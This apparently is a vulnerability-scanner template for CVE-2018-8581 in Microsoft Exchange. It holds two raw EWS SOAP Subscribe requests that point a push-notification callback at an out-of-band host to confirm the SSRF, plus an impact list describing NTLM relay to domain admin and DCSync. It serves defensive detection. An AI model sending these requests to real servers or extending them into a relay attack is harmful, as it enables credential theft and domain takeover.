http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - SSRF/Privilege Escalation via EWS PushSubscription
  author: SolariSystems
  severity: high
  description: |
    Microsoft Exchange Server 2010 SP3, 2013, 2016, and 2019 contain a Server-Side Request Forgery
    (SSRF) vulnerability in the Exchange Web Services (EWS) PushSubscription feature. An authenticated
    attacker can create a push notification subscription that forces Exchange to authenticate to an
    arbitrary URL using NTLM. This authentication can be relayed to other services, potentially
    allowing privilege escalation to domain administrator. The vulnerability exists because Exchange
    performs NTLM authentication to callback URLs without proper validation or mutual authentication.
  impact: |
    Successful exploitation enables an authenticated attacker to:
    - Force Exchange server to perform NTLM authentication to attacker-controlled endpoints
    - Relay captured NTLM credentials to Active Directory or other services
    - Escalate privileges potentially to Domain Administrator level
    - Perform DCSync attacks to dump domain credentials
    - Impersonate Exchange server identity across the domain
  remediation: |
    Apply Microsoft security updates that address CVE-2018-8581. Additionally:
    - Enable Extended Protection for Authentication on Exchange virtual directories
    - Enable LDAP signing and channel binding on Domain Controllers
    - Enable SMB signing across the domain
    - Consider restricting EWS access to trusted applications
    - Monitor for anomalous Exchange-initiated connections
  reference:
    - https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
    - https://github.com/dirkjanm/privexchange
    - https://github.com/Ridter/Exchange2domain
    - https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8581
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-8581
    cwe-id: CWE-918,CWE-287
    epss-score: 0.97108
    epss-percentile: 0.99818
    cpe: cpe:2.3:a:microsoft:exchange_server:2010:sp3:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: microsoft
    product: exchange_server
    shodan-query: http.title:"Outlook" product:"Microsoft Exchange"
    fofa-query: app="Microsoft-Exchange"
    verified: true
    kev: true
  tags: cve,cve2018,microsoft,exchange,ews,ssrf,ntlm,relay,privesc,kev

http:
  - raw:
      # Phase 1: Probe EWS endpoint and trigger NTLM challenge
      - |
        POST /EWS/Exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                       xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                       xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2016"/>
          </soap:Header>
          <soap:Body>
            <m:Subscribe>
              <m:PushSubscriptionRequest SubscribeToAllFolders="true">
                <t:EventTypes>
                  <t:EventType>NewMailEvent</t:EventType>
                </t:EventTypes>
                <t:StatusFrequency>1</t:StatusFrequency>
                <t:URL>http://{{interactsh-url}}</t:URL>
              </m:PushSubscriptionRequest>
            </m:Subscribe>
          </soap:Body>
        </soap:Envelope>

      # Phase 2: Alternative probe with Exchange2010 version for broader coverage
      - |
        POST /EWS/Exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        User-Agent: ExchangeServicesClient/15.00.0913.015

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                       xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                       xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2010_SP2"/>
          </soap:Header>
          <soap:Body>
            <m:Subscribe>
              <m:PushSubscriptionRequest>
                <t:FolderIds>
                  <t:DistinguishedFolderId Id="inbox"/>
                </t:FolderIds>
                <t:EventTypes>
                  <t:EventType>NewMailEvent</t:EventType>
                  <t:EventType>ModifiedEvent</t:EventType>
                </t:EventTypes>
                <t:StatusFrequency>1</t:StatusFrequency>
                <t:URL>http://{{interactsh-url}}</t:URL>
              </m:PushSubscriptionRequest>
            </m:Subscribe>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      # Matcher 1: Confirm Exchange server via characteristic response headers
      - type: dsl
        name: exchange-server-detected
        dsl:
          - 'contains(tolower(header), "x-owa-version") || contains(tolower(header), "x-feserver") || contains(tolower(header), "x-calculatedbetarget")'

      # Matcher 2: Confirm NTLM authentication is required (proves EWS is accessible)
      - type: word
        part: header
        words:
          - "WWW-Authenticate: NTLM"
          - "WWW-Authenticate: Negotiate"
        condition: or

      # Matcher 3: SSRF confirmed via OAST callback - the definitive POC
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or

    extractors:
      # Extract Exchange version from response headers
      - type: regex
        name: exchange-version
        part: header
        group: 1
        regex:
          - 'X-OWA-Version:\s*([0-9.]+)'
          - 'X-FEServer:\s*([A-Za-z0-9\-]+)'

      # Extract request ID for forensic correlation
      - type: kval
        name: request-id
        kval:
          - request_id
          - X_MS_Request_ID

      # Extract authentication methods supported
      - type: regex
        name: auth-methods
        part: header
        group: 0
        regex:
          - 'WWW-Authenticate:\s*[^\r\n]+'
